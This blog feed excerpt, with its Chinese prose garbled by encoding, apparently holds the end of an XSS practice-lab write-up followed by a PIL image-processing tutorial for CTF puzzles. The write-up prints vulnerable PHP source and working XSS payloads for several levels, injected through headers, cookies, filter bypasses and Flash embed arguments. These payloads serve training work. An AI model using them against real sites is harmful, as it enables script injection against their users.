<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">referer:<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h5 id="level12"><a href="#level12" class="headerlink" title="level12"></a><strong>level12</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>

<p>å’Œ11å…³ç±»ä¼¼ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200429203527694.png" alt="image-20200429203527694" style="high:80%;width:80%;" />

<p><strong>payloadï¼š</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">User-Agent:<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h5 id="level13"><a href="#level13" class="headerlink" title="level13"></a><strong>level13</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>

<p>å’Œå‰ä¸¤å…³å·®ä¸å¤šï¼Œä¼ cookieè¿›userå˜é‡ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200429204317830.png" alt="image-20200429204317830" style="high:80%;width:80%;" />

<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">user=<span class="string">&quot; onclick=alert(/xss/) type=&quot;</span>button<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="level16"><a href="#level16" class="headerlink" title="level16"></a><strong>level16</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,$str4);</span><br><span class="line">echo <span class="string">&quot;&lt;center&gt;&quot;</span>.$str5.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>ç©ºæ ¼è¢«è¿‡æ»¤äº†</p>
<p><strong>payloadï¼š</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?keyword=<span class="xml"><span class="tag">&lt;<span class="name">img%0dsrc=1%0donerror=alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h5 id="level17"><a href="#level17" class="headerlink" title="level17"></a><strong>level17</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payloadï¼š</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?arg01=a&amp;arg02= onclick=alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h5 id="level19"><a href="#level19" class="headerlink" title="level19"></a><strong>level19</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&#x27;&lt;embed src=&quot;xsf03.swf?&#x27;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å…³æ˜¯flash xssã€‚è¿™ç§xssæ¯”è¾ƒå°‘è§ï¼Œå…·ä½“è¯¦æƒ…ï¼š<a style="text-decoration:none;" class="foo" href="https://wizardforcel.gitbooks.io/xss-naxienian/content/14.html" target="_blank">ä¼ é€é—¨</a></p>
<p><strong>paylaod:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?arg01=version&amp;arg02=<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>= <span class="string">&quot;javascript:alert(document.domain)&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>åˆ·é¢˜</category>
      </categories>
  </entry>
  <entry>
    <title>å¦‚ä½•ç”¨PILåº“å¤„ç†å›¾ç‰‡</title>
    <url>/2020/04/19/%E5%A6%82%E4%BD%95%E7%94%A8PIL%E5%BA%93%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h4><p>æœ€è¿‘æœ‰å‡ åœºCTFæ¯”èµ›ï¼Œé‡Œé¢çš„é¢˜éƒ½ä¸ä¼šåšï¼Œæ²¡æœ‰æ€è·¯ï¼Œæ„Ÿè§‰è‡ªå·±ç°åœ¨çš„çŠ¶æ€å°±æ˜¯æ€è€Œä¸å­¦åˆ™æ®†ï¼Œäºæ˜¯ä¹å°±åœ¨bugkué‡Œé¢åˆ·æ‚é¡¹é¢˜ã€‚é‡åˆ°ä¸€äº›å›¾ç‰‡çš„é¢˜ç›®ï¼Œé™¤äº†ä½¿ç”¨kailçš„binwalk,foremostéšå†™å›¾ç‰‡å’Œæ”¹é«˜åº¦å®½åº¦ä»¥åŠä½¿ç”¨ä¸€äº›å·¥å…·ä¹‹å¤–ï¼Œè¿˜å‘ç°æœ‰å¥½å‡ é¢˜éƒ½è¦ç”¨åˆ°PILåº“è¿™ä¸ªä¸œè¥¿ï¼Œå°±è®°å½•ä¸€ä¸‹æ€ä¹ˆç”¨ã€‚</p>
<p>å…³äºPILåº“çš„æ›´å¤šç”¨æ³•å¯ä»¥å‚è€ƒï¼š<a style="text-decoration:none;" class="foo" href="https://www.liaoxuefeng.com/wiki/897692888725344/966759628285152" target="_blank">ä¼ é€é—¨</a></p>
<h4 id="ä½¿ç”¨PILåº“"><a href="#ä½¿ç”¨PILåº“" class="headerlink" title="ä½¿ç”¨PILåº“"></a><strong>ä½¿ç”¨PILåº“</strong></h4><p><strong>å®‰è£…åº“</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br></pre></td></tr></table></figure>

<p><strong>åŠ è½½å›¾ç‰‡ï¼Œä½¿ç”¨æ–¹æ³•open</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>imæ˜¯ä¸€ä¸ªImageå¯¹è±¡ï¼Œå±æ€§æœ‰formatï¼Œsizeï¼Œmodeã€‚formatæ˜¯æ ¼å¼ï¼Œsize æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨ç¤º(å®½ï¼Œé«˜)ï¼Œmodeåˆ™æŒ‡çš„å›¾ç‰‡çš„æ¨¡å¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> im.format,im.size,im.mode</span><br></pre></td></tr></table></figure>

<p>consoleè¾“å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">JPEG (<span class="number">245</span>, <span class="number">280</span>) RGB</span><br></pre></td></tr></table></figure>

<p><strong>å‘ˆç°å›¾ç‰‡ï¼Œæ–¹æ³•showæ–¹ä¾¿ç”¨æ¥è°ƒè¯•å’Œæµ‹è¯•ã€‚</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>

<p><strong>å›¾ç‰‡çš„è¯»å’Œå†™</strong></p>
<p>è¯»æ–‡ä»¶ç”¨Image.open()ï¼Œä¿å­˜æ–‡ä»¶ç”¨Image.save()ï¼Œä¹Ÿå¯ä»¥ç”¨saveæ–¹æ³•æ¥è¿›è¡Œå›¾ç‰‡çš„æ ¼å¼è½¬æ¢ã€‚ä½¿ç”¨osæ¨¡å—ä¸­çš„os.path.splitext()æ–¹æ³•å¯ä»¥è®²æ–‡ä»¶åå’Œæ‰©å±•ååˆ†ç¦»å¼€æ¥ï¼Œä¸‹é¢çš„ä»£ç èƒ½å¤ŸæŠŠjpgæ ¼å¼çš„å›¾ç‰‡è½¬ä¸ºpngæ ¼å¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">infile = <span class="string">&#x27;Mycat.jpg&#x27;</span></span><br><span class="line">f,e = os.path.splitext(infile)</span><br><span class="line">outfile = f + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"> Image.open(infile).save(outfile)</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line"> <span class="keyword">print</span> <span class="string">&quot;cannot convert&quot;</span>,infile</span><br></pre></td></tr></table></figure>

<p><strong>å›¾ç‰‡çš„å‰ªåˆ‡ï¼Œé»è´´</strong></p>
<p><strong>(1)</strong> <strong>å›¾ç‰‡å‰ªåˆ‡</strong></p>
<p>ä»ä¸€å¼ å›¾ç‰‡ä¸­å‰ªåˆ‡å‡ºä¸€å—åŒºåŸŸï¼Œæ¯”å¦‚ä»å›¾ç‰‡æå–çŸ©å½¢ï¼Œä½¿ç”¨crop()æ–¹æ³•ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">150</span>,<span class="number">150</span>,<span class="number">245</span>,<span class="number">280</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line">region.show()</span><br></pre></td></tr></table></figure>

<p>å…³äºè¿™ä¸ªboxï¼Œè¿™æ˜¯ä¸€ä¸ª4å…ƒçš„åæ ‡æ•°ç»„ï¼Œåæ ‡è½´æ˜¯å·¦ä¸Šè§’æ˜¯(0,0)çš„å¡è¿ªå°”åæ ‡ç³»ã€‚ å‡è®¾boxæ˜¯(x1,y1,x2,y2)ï¼Œåˆ™æ‰€å–åŒºåŸŸæ˜¯ä»¥å„è‡ªåæ ‡åˆ’çº¿æ‰€å›´çš„åŒºåŸŸã€‚</p>
<img src="http://img.kawhi.xyz/image-20200419225057613.png" alt="image-20200419225057613" style="high:80%;width:80%;" />

<p><strong>ï¼ˆ2ï¼‰å›¾ç‰‡é»è´´</strong></p>
<p>å›¾ç‰‡çš„é»è´´å°±æ˜¯å°†ä¸€å¼ å›¾è¦†ç›–åˆ°å¦ä¸€å¼ å›¾ä¸Šé¢ã€‚é»è´´çš„æ–¹æ³•æ˜¯paste()ã€‚æ ¼å¼ä¸ºï¼špaste(è¦è´´çš„å›¾ç‰‡ï¼Œè¦è´´çš„å›¾ç‰‡çš„4å…ƒåæ ‡ç»„æˆçš„åŒºåŸŸ)ã€‚å¦‚ä¸‹é¢ï¼Œæˆ‘ä»¬æŠŠMycat.jpgè¿™å¼ å›¾ç‰‡ï¼Œå–åŒºåŸŸ(50,50,200,200)ï¼Œå°†è¯¥åŒºåŸŸæ—‹è½¬180åº¦åè´´åˆ°åŸæ¥çš„ä½ç½®ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">50</span>,<span class="number">50</span>,<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line"><span class="comment"># å°†å›¾ç‰‡é€†åºæ—‹è½¬180åï¼Œé»è´´åˆ°åŸæ¥å¤åˆ¶çš„ä½ç½® </span></span><br><span class="line">region = region.transpose(Image.ROTATE_180)</span><br><span class="line">im.paste(region,box)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>

<p><strong>å›¾åƒåºåˆ—</strong></p>
<p>å½“å¤„ç†GIFè¿™ç§åŒ…å«å¤šä¸ªå¸§çš„å›¾ç‰‡ï¼Œç§°ä¹‹ä¸ºåºåˆ—æ–‡ä»¶ï¼ŒPILä¼šè‡ªåŠ¨æ‰“å¼€åºåˆ—æ–‡ä»¶çš„ç¬¬ä¸€å¸§ã€‚è€Œä½¿ç”¨seekå’Œtellæ–¹æ³•å¯ä»¥åœ¨ä¸åŒå¸§ç§»åŠ¨ã€‚tellæ˜¯å¸§æ•°ï¼Œè€Œseekæ˜¯å–å½“å‰å¸§æ•°çš„å›¾ç‰‡ã€‚</p>
<p>ä½¿ç”¨whileå¾ªç¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">im &#x3D; Image.open(&quot;laopo.gif&quot;)</span><br><span class="line">im.seek(1)</span><br><span class="line">im.show()</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line"> while 1:</span><br><span class="line"> im.seek(im.tell()+1)</span><br><span class="line"> im.show()</span><br><span class="line">except EOFError:</span><br><span class="line"> pass</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¦ä½¿ç”¨forå¾ªç¯ï¼Œå¯ä»¥ä½¿ç”¨ImageSequenceæ¨¡å—çš„Iteratoræ–¹æ³•ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageSequence</span><br><span class="line"> </span><br><span class="line">im = Image.open(<span class="string">&quot;laopo.gif&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> ImageSequence.Iterator(im):</span><br><span class="line">  frame.show()</span><br></pre></td></tr></table></figure>

<p><strong>è¯»å–åƒç´ å’Œä¿®æ”¹åƒç´ </strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">    tmp = img.getpixel((i,j))</span><br><span class="line">    img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,tmp[<span class="number">2</span>]))</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<h4 id="CTFå®ä¾‹ï¼š"><a href="#CTFå®ä¾‹ï¼š" class="headerlink" title="CTFå®ä¾‹ï¼š"></a><strong>CTFå®ä¾‹ï¼š</strong></h4><h5 id="çº¢ç»¿ç¯"><a href="#çº¢ç»¿ç¯" class="headerlink" title="çº¢ç»¿ç¯"></a><strong>çº¢ç»¿ç¯</strong></h5><p>é¦–å…ˆé¢˜ç›®æ˜¯ä¸€å¼ gifï¼Œç”¨2345çœ‹å›¾ç‹æˆ–è€…PSæ‰“å¼€éƒ½å¯ä»¥ï¼Œä¼šå‘ç°æœ‰1168å¸§ï¼Œç„¶åä¿å­˜æ‰€æœ‰å¸§ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200419184820875.png" alt="image-20200419184820875" style="high:80%;width:80%;" />

<p>ä¼šå‘ç°å¤šæ•°æ˜¯ç»¿ç¯å’Œçº¢ç¯ï¼Œå¶å°”æœ‰é»„ç¯ï¼Œå¯ä»¥æ¨æµ‹çº¢è‰²å’Œç»¿è‰²å¯¹åº”äºŒè¿›åˆ¶0å’Œ1ï¼Œé»„è‰²ä½œä¸ºåˆ†éš”ã€‚</p>
<p>è¿™æ ·ç¬¬ä¸€ä¸ªé»„ç¯ä¹‹å‰æ•°å€¼ä¸º01100110æˆ–10011001ï¼Œè€Œ01100110äºŒè¿›åˆ¶è½¬æˆasciiå¯¹åº”å­—ç¬¦å°±æ˜¯â€˜fâ€™,ä¾æ¬¡å¯ä»¥éªŒè¯å‰å››ä¸ªå­—ç¬¦ä¸ºflagã€‚å°±å¯ä»¥ç¡®å®šç»¿ç¯å¯¹åº”0ï¼Œçº¢ç¯å¯¹åº”1ã€‚</p>
<p>è¿™é‡Œå¦‚æœæ‰‹åŠ¨ç®—çš„è¯æ˜¯å¯ä»¥ä¸€å¼ ä¸€å¼ è¿™æ ·ç®—å‡ºflagçš„ã€‚ä¹Ÿå¯ä»¥ç”¨pythonçš„PILåº“ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\Traffic_Light_gif\\&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1168</span>):</span><br><span class="line">	image=Image.open(path+<span class="string">&#x27;Traffic_Light_&#x27;</span>+str(i)+<span class="string">&#x27;.JPG&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> image.getpixel((<span class="number">115</span>,<span class="number">55</span>))==(<span class="number">254</span>, <span class="number">0</span>, <span class="number">0</span>): <span class="comment">#å¦‚æœä¸Šç¯ç­‰äºçº¢</span></span><br><span class="line">		    flag+=str(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">elif</span> image.getpixel((<span class="number">115</span>,<span class="number">145</span>))==(<span class="number">8</span>, <span class="number">253</span>, <span class="number">8</span>): <span class="comment">#å¦‚æœä¸‹ç¯ç­‰äºç»¿</span></span><br><span class="line">		    flag+=str(<span class="number">0</span>)</span><br><span class="line">flag= hex(int(flag,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å…ˆç”¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(image.getpixel((<span class="number">115</span>,<span class="number">55</span>)))</span><br><span class="line">print(image.getpixel((<span class="number">115</span>,<span class="number">145</span>)))</span><br></pre></td></tr></table></figure>

<p>æµ‹å‡º(254, 0, 0)ä¸ºçº¢ï¼Œ(172, 172, 172)ä¸ºç°ï¼Œ(8, 253, 8)ä¸ºç»¿ã€‚å…¶ä¸­</p>
<p>(115,55)å’Œ(115,145)æ˜¯åæ ‡ã€‚</p>
<p>è¿è¡Œè„šæœ¬å³å¯å¾—åˆ°flagã€‚</p>
<h5 id="GIFå›¾ç‰‡åˆå¹¶"><a href="#GIFå›¾ç‰‡åˆå¹¶" class="headerlink" title="GIFå›¾ç‰‡åˆå¹¶"></a><strong>GIFå›¾ç‰‡åˆå¹¶</strong></h5><p>é¦–å…ˆåŒæ ·ç”¨2345çœ‹å›¾ç‹åˆ†ç¦»å¸§ã€‚ä¸€å…±æœ‰201å¸§ã€‚</p>
<p>ç„¶åè§‚å¯Ÿæ¯å¼ å›¾ç‰‡çš„å¤§å°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\glance\\&#x27;</span></span><br><span class="line"></span><br><span class="line">im=Image.open(path+<span class="string">&#x27;glance_1&#x27;</span>+<span class="string">&#x27;.JPG&#x27;</span>)</span><br><span class="line">print(im.size)</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœä¸º(2, 600)ï¼Œå¯ä»¥çœ‹å‡ºæ¯ä¸€å¸§çš„å®½åº¦ä¸º2ã€‚é«˜åº¦ä¸º600ã€‚</p>
<p>æ€è·¯ä¸ºï¼šå»ºä¸€å¼ å¤§å›¾ï¼Œç„¶åå°†æ¯ä¸€å¸§ä¾æ¬¡é»è´´ä¸Šå»ã€‚</p>
<p>ç¼–å†™è„šæœ¬ä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\glance\\&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>))</span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">201</span>):</span><br><span class="line">  im.paste(Image.open(path+<span class="string">&#x27;glance_&#x27;</span>+str(i)+<span class="string">&#x27;.JPG&#x27;</span>),(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br><span class="line">  width = width +<span class="number">2</span></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>

<h5 id="åˆ¤æ–­å›¾ç‰‡é¢œè‰²"><a href="#åˆ¤æ–­å›¾ç‰‡é¢œè‰²" class="headerlink" title="åˆ¤æ–­å›¾ç‰‡é¢œè‰²"></a><strong>åˆ¤æ–­å›¾ç‰‡é¢œè‰²</strong></h5><p>é¢˜ç›®æ˜¯ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200419200921372.png" alt="image-20200419200921372" style="high:80%;width:80%;" />

<p>è¿™é‡Œåº”è¯¥æ˜¯é»‘è‰²ç™½è‰²å¯¹åº”01ï¼Œç„¶åè½¬æˆå­—ç¬¦ä¸²ã€‚</p>
<p>ç¼–å†™è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\gif\\&#x27;</span></span><br><span class="line"></span><br><span class="line">sumDo = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sumNo = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">104</span>):</span><br><span class="line">	<span class="keyword">if</span> Image.open(path+str(i)+<span class="string">&#x27;.jpg&#x27;</span>).getcolors()[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>] == <span class="number">12</span>:</span><br><span class="line">		sumDo +=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">		sumNo +=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sumDo +=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">		sumNo +=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (hex(int(sumDo,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> (hex(int(sumNo,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å³å¯å¾—åˆ°flagã€‚</p>
<h5 id="LSBéšå†™"><a href="#LSBéšå†™" class="headerlink" title="LSBéšå†™"></a><strong>LSBéšå†™</strong></h5><p>LSBéšå†™å°±æ˜¯ä¿®æ”¹RGBé¢œè‰²åˆ†é‡çš„æœ€ä½äºŒè¿›åˆ¶ä½ä¹Ÿå°±æ˜¯æœ€ä½æœ‰æ•ˆä½ï¼ˆLSBï¼‰</p>
